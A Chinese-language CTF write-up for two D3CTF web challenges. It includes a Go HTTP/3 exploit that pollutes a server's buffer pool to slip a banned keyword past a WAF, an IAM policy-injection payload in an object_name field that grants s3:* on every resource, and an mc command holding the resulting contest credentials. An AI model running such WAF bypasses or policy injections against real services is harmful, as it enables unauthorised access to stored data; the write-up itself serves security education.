&#123;</span><br><span class="line">		_, _ = w.Write([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;FLAG&quot;</span>)))</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		_, _ = w.Write(item)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> wrap <span class="keyword">struct</span> &#123;</span><br><span class="line">	io.ReadCloser</span><br><span class="line">	ban []<span class="type">byte</span></span><br><span class="line">	idx <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *wrap)</span></span> Read(p []<span class="type">byte</span>) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	n, err := w.ReadCloser.Read(p)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; !errors.Is(err, io.EOF) &#123;</span><br><span class="line">		<span class="keyword">return</span> n, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> p[i] == w.ban[w.idx] &#123;</span><br><span class="line">			w.idx++</span><br><span class="line">			<span class="keyword">if</span> w.idx == <span class="built_in">len</span>(w.ban) &#123;</span><br><span class="line">				<span class="keyword">return</span> n, ErrWAF</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			w.idx = <span class="number">0</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> n, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">textInterrupterWrap</span><span class="params">(rc io.ReadCloser)</span></span> io.ReadCloser &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;wrap&#123;</span><br><span class="line">		rc, []<span class="type">byte</span>(<span class="string">&quot;flag&quot;</span>), <span class="number">0</span>,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里主要的思考点在于<code>I want</code>后怎么加上<code>flag</code>，有WAF存在。</p>
+<p>这里注意到BufferPool的存在，存在BufferPool的内存复用。</p>
+<p>先是利用发送<code>123456flag</code>，再发送<code>I want</code>，由于BufferPool没有清空，使<code>I want</code>覆盖掉之前的<code>123456</code>，从而构造出<code>I wantflag</code></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/tls&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	quic <span class="string">&quot;github.com/quic-go/quic-go&quot;</span> <span class="comment">// 明确导入quic包</span></span><br><span class="line">	<span class="string">&quot;github.com/quic-go/quic-go/http3&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	targetURL   = <span class="string">&quot;https://35.220.136.70:31779&quot;</span></span><br><span class="line">	polluteData = <span class="string">&quot;111111flag&quot;</span> <span class="comment">// 污染数据</span></span><br><span class="line">	realPayload = <span class="string">&quot;I want&quot;</span>     <span class="comment">// 有效载荷</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 创建优化的HTTP/3客户端</span></span><br><span class="line">	client := &amp;http.Client&#123;</span><br><span class="line">		Transport: &amp;http3.RoundTripper&#123;</span><br><span class="line">			TLSClientConfig: &amp;tls.Config&#123;</span><br><span class="line">				InsecureSkipVerify: <span class="literal">true</span>,</span><br><span class="line">				NextProtos:         []<span class="type">string</span>&#123;<span class="string">&quot;h3&quot;</span>&#125;, <span class="comment">// 必须指定ALPN</span></span><br><span class="line">			&#125;,</span><br><span class="line">			QUICConfig: &amp;quic.Config&#123; <span class="comment">// 修正字段名为大写QUICConfig</span></span><br><span class="line">				MaxIncomingStreams: <span class="number">1000</span>, <span class="comment">// 提高并发能力</span></span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		Timeout: <span class="number">15</span> * time.Second,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> client.CloseIdleConnections()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 阶段1：增强型缓冲池污染</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;[*] 启动HTTP/3缓冲池污染攻击...&quot;</span>)</span><br><span class="line">	start := time.Now()</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">200</span>; i++ &#123; <span class="comment">// 高频并发污染</span></span><br><span class="line">		wg.Add(<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			<span class="keyword">defer</span> wg.Done()</span><br><span class="line">			req, _ := http.NewRequest(<span class="string">&quot;POST&quot;</span>, targetURL, bytes.NewBufferString(polluteData))</span><br><span class="line">			client.Do(req)</span><br><span class="line">		&#125;()</span><br><span class="line">	&#125;</span><br><span class="line">	wg.Wait()</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 阶段2：精确内存布局触发</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] 污染完成 (耗时: %v)\n[*] 触发组合攻击...\n&quot;</span>, time.Since(start))</span><br><span class="line">	time.Sleep(<span class="number">800</span> * time.Millisecond) <span class="comment">// 关键时间窗口</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用Content-Length技巧</span></span><br><span class="line">	body := io.NopCloser(bytes.NewReader([]<span class="type">byte</span>(realPayload)))</span><br><span class="line">	req, _ := http.NewRequest(<span class="string">&quot;POST&quot;</span>, targetURL, body)</span><br><span class="line">	req.ContentLength = <span class="number">10</span> <span class="comment">// 故意设置大于实际长度</span></span><br><span class="line"></span><br><span class="line">	resp, err := client.Do(req)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;请求失败: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 结果分析</span></span><br><span class="line">	response, _ := io.ReadAll(resp.Body)</span><br><span class="line">	<span class="keyword">if</span> bytes.Contains(response, []<span class="type">byte</span>(<span class="string">&quot;FLAG&quot;</span>)) &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;[+] 攻击成功! 状态码: %d\nFLAG: %s\n&quot;</span>,</span><br><span class="line">			resp.StatusCode, extractFlag(response))</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;[-] 攻击失败 状态码: %d\n响应: %s\n&quot;</span>,</span><br><span class="line">			resp.StatusCode, truncate(<span class="type">string</span>(response)))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">extractFlag</span><span class="params">(data []<span class="type">byte</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	flagStart := bytes.Index(data, []<span class="type">byte</span>(<span class="string">&quot;FLAG&#123;&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> flagStart == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="type">string</span>(data[flagStart : bytes.IndexByte(data[flagStart:], <span class="string">&#x27;&#125;&#x27;</span>)+<span class="number">1</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">truncate</span><span class="params">(s <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(s) &gt; <span class="number">100</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> s[:<span class="number">100</span>] + <span class="string">&quot;...&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250531154847317.png" alt="image-20250531154847317"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d3ctf&#123;YOu-sAld_RlGhT-BUt-y0u-sH0Uld_p1Ay-G3nsH1n_imPact2&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="d3invitation"><a href="#d3invitation" class="headerlink" title="d3invitation"></a>d3invitation</h2><p>功能是输入id与上传照片创建邀请函</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250603002320440.png" alt="image-20250603002320440" style="zoom:80%;" />
+
+<p>先看看前端js源码，tools.js：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">generateInvitation</span>(<span class="params">user_id, avatarFile</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (avatarFile) &#123;</span><br><span class="line">        object_name = avatarFile.<span class="property">name</span>;</span><br><span class="line">        <span class="title function_">genSTSCreds</span>(object_name)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function"><span class="params">credsData</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_">putAvatar</span>(</span><br><span class="line">                    credsData.<span class="property">access_key_id</span>,</span><br><span class="line">                    credsData.<span class="property">secret_access_key</span>,</span><br><span class="line">                    credsData.<span class="property">session_token</span>,</span><br><span class="line">                    object_name,</span><br><span class="line">                    avatarFile</span><br><span class="line">                ).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="title function_">navigateToInvitation</span>(</span><br><span class="line">                        user_id,</span><br><span class="line">                        credsData.<span class="property">access_key_id</span>,</span><br><span class="line">                        credsData.<span class="property">secret_access_key</span>,</span><br><span class="line">                        credsData.<span class="property">session_token</span>,</span><br><span class="line">                        object_name</span><br><span class="line">                    )</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error generating STS credentials or uploading avatar:&#x27;</span>, error);</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">navigateToInvitation</span>(user_id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">navigateToInvitation</span>(<span class="params">user_id, access_key_id, secret_access_key, session_token, object_name</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> url = <span class="string">`invitation?user_id=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(user_id)&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (access_key_id) &#123;</span><br><span class="line">        url += <span class="string">`&amp;access_key_id=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(access_key_id)&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (secret_access_key) &#123;</span><br><span class="line">        url += <span class="string">`&amp;secret_access_key=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(secret_access_key)&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (session_token) &#123;</span><br><span class="line">        url += <span class="string">`&amp;session_token=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(session_token)&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (object_name) &#123;</span><br><span class="line">        url += <span class="string">`&amp;object_name=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(object_name)&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">genSTSCreds</span>(<span class="params">object_name</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> genSTSJson = &#123;</span><br><span class="line">            <span class="string">&quot;object_name&quot;</span>: object_name</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;/api/genSTSCreds&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(genSTSJson)</span><br><span class="line">        &#125;)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!response.<span class="property">ok</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Network response was not ok&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> response.<span class="title function_">json</span>();</span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">resolve</span>(data);</span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">reject</span>(error);</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getAvatarUrl</span>(<span class="params">access_key_id, secret_access_key, session_token, object_name</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`/api/getObject?access_key_id=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(access_key_id)&#125;</span>&amp;secret_access_key=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(secret_access_key)&#125;</span>&amp;session_token=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(session_token)&#125;</span>&amp;object_name=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(object_name)&#125;</span>`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">putAvatar</span>(<span class="params">access_key_id, secret_access_key, session_token, object_name, avatar</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">        formData.<span class="title function_">append</span>(<span class="string">&#x27;access_key_id&#x27;</span>, access_key_id);</span><br><span class="line">        formData.<span class="title function_">append</span>(<span class="string">&#x27;secret_access_key&#x27;</span>, secret_access_key);</span><br><span class="line">        formData.<span class="title function_">append</span>(<span class="string">&#x27;session_token&#x27;</span>, session_token);</span><br><span class="line">        formData.<span class="title function_">append</span>(<span class="string">&#x27;object_name&#x27;</span>, object_name);</span><br><span class="line">        formData.<span class="title function_">append</span>(<span class="string">&#x27;avatar&#x27;</span>, avatar);</span><br><span class="line"></span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;/api/putObject&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">body</span>: formData</span><br><span class="line">        &#125;)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!response.<span class="property">ok</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Network response was not ok&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> response.<span class="title function_">json</span>();</span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">resolve</span>(data);</span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">reject</span>(error);</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现存在三个接口<code>/api/genSTSCreds</code>，<code>/api/getObject</code>，<code>/api/putObject</code>，第一眼感觉像是云安全，给了ak、sk，是<strong>AWS S3</strong>云存储桶</p>
+<p>代码中的 <code>genSTSCreds</code> 和 <code>putAvatar</code> 函数使用了 <code>access_key_id</code>、<code>secret_access_key</code> 和 <code>session_token</code>，这符合AWS STS（Security Token Service）的临时凭证机制，通常用于AWS S3存储桶的访问控制</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250603002840056.png" alt="image-20250603002840056"></p>
+<p>获取了一大串<code>session_token</code>，是jwt，直接解码看看。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250603003835081.png" alt="image-20250603003835081"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250603003956632.png" alt="image-20250603003956632"></p>
+<p>发现有输入的部分内容存在，猜测可以进行RAM策略注入</p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/4340">https://forum.butian.net/share/4340</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;Version&quot;:&quot;2012-10-17&quot;,&quot;Statement&quot;:[&#123;&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:[&quot;s3:GetObject&quot;,&quot;s3:PutObject&quot;],&quot;Resource&quot;:[&quot;arn:aws:s3:::d3invitation/test.txt&quot;]&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot;: &quot;2012-10-17&quot;,  // 策略语法版本（固定值）</span><br><span class="line">  &quot;Statement&quot;: [  // 权限声明列表</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot;: &quot;Allow&quot;,  // 允许操作（Deny表示拒绝）</span><br><span class="line">      &quot;Action&quot;: [  // 允许的具体操作</span><br><span class="line">        &quot;s3:GetObject&quot;,   // 允许下载对象</span><br><span class="line">        &quot;s3:PutObject&quot;    // 允许上传对象</span><br><span class="line">      ],</span><br><span class="line">      &quot;Resource&quot;: [  // 作用的目标资源</span><br><span class="line">        &quot;arn:aws:s3:::d3invitation/test.txt&quot;  // 资源ARN（Amazon Resource Name）</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现是IAM 策略，一种通过Json控制的，比ACL更加精确的权限控制</p>
+<p>先举个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">当我们输入:</span><br><span class="line"></span><br><span class="line">aaa&quot;]&#125;,&#123;&quot;effect&quot;: &quot;allow&quot;,&quot;action&quot;:[&quot;&quot;],&quot;resource&quot;:[&quot;qcs::cos:&quot;,&quot;qcs::cvm:*</span><br><span class="line">RAM策略就是</span><br><span class="line"></span><br><span class="line">&#123;&quot;version&quot;:&quot;2.0&quot;,&quot;statement&quot;:[&#123;&quot;effect&quot;:&quot;allow&quot;,&quot;action&quot;:[&quot;name/cos:PutObject&quot;,&quot;name/cos:PostObject&quot;,&quot;name/cos:DeleteObject&quot;,&quot;name/cos:InitiateMultipartUpload&quot;,&quot;name/cos:UploadPart&quot;,&quot;name/cos:CompleteMultipartUpload&quot;,&quot;name/cos:AbortMultipartUpload&quot;],&quot;resource&quot;:[&quot;qcs::cos:ap-guangzhou:uid/1304445672:prefix//1304445672/teach/1000001/aaaa/upload/aaa&quot;]&#125;,&#123;&quot;effect&quot;: &quot;allow&quot;,&quot;action&quot;:[&quot;&quot;],&quot;resource&quot;:[&quot;qcs::cos:&quot;,&quot;qcs::cvm:*&quot;]&#125;]&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>因此，接下来我们构造一下<code>object_name</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;object_name&quot;:&quot;*\&quot;]&#125;,&#123;\&quot;Effect\&quot;: \&quot;Allow\&quot;,\&quot;Action\&quot;:[\&quot;s3:*\&quot;],\&quot;Resource\&quot;:[\&quot;arn:aws:s3:::*&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250603023107075.png" alt="image-20250603023107075"></p>
+<p>由于题目环境是<strong>一个基于Apache License v2.0开源协议的对象存储服务</strong>，用mc这个工具<a target="_blank" rel="noopener" href="https://github.com/minio/mc">https://github.com/minio/mc</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250603023043117.png" alt="image-20250603023043117"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export MC_HOST_d3invitation=&quot;http://7VJGQUHVNUIAA2M2AT1B:XRgS6+RMFpG2gvjaySCt12owIztkc5kNo4O3tHUN:eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiI3VkpHUVVIVk5VSUFBMk0yQVQxQiIsImV4cCI6MTc0ODg5MjUwOSwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZVSFYwVDJKcVpXTjBJaXdpY3pNNlIyVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2S2lKZGZTeDdJa1ZtWm1WamRDSTZJa0ZzYkc5M0lpd2lRV04wYVc5dUlqcGJJbk16T2lvaVhTd2lVbVZ6YjNWeVkyVWlPbHNpWVhKdU9tRjNjenB6TXpvNk9pb2lYWDFkZlE9PSJ9.6d7BfnPorhh7dL79V5HCs0Cw8SP2yJwXKw9sEz_JX8z80xZDqTKVJvECkZJVxcQEEHU6vIqhH2YdLmNCrPe9pA@35.241.98.126:30121&quot;</span><br></pre></td></tr></table></figure>
+
+<p>拿捏了已经。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250603023152342.png" alt="image-20250603023152342"></p>
